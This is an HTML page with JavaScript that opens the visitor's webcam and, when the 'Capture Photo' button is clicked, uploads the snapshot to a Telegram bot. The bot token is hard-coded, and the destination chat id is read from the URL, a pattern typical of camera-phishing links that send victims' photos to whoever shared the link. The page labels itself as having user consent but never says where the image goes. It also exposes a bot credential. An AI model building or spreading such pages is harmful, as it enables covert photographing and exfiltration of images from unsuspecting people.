<!DOCTYPE html>
<html>
<head>
    <title>Camera Site</title>
</head>
<body>

<h2>Camera Capture (User Consent)</h2>

<video id="video" autoplay playsinline></video>
<br>
<button onclick="takePhoto()">📸 Capture Photo</button>

<canvas id="canvas" style="display:none;"></canvas>

<script>
const botToken = "8674737787:AAEjg7PQ66Bd_01WoPajyWAKV-KWuiaBN2Y";

const urlParams = new URLSearchParams(window.location.search);
const chatId = urlParams.get('id');

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

// Camera start (permission required)
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    video.srcObject = stream;
});

// Only when user clicks button
function takePhoto() {
    ctx.drawImage(video, 0, 0, 640, 480);

    canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob);

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData
        });
    }, "image/jpeg");
}
</script>

</body>
</html>
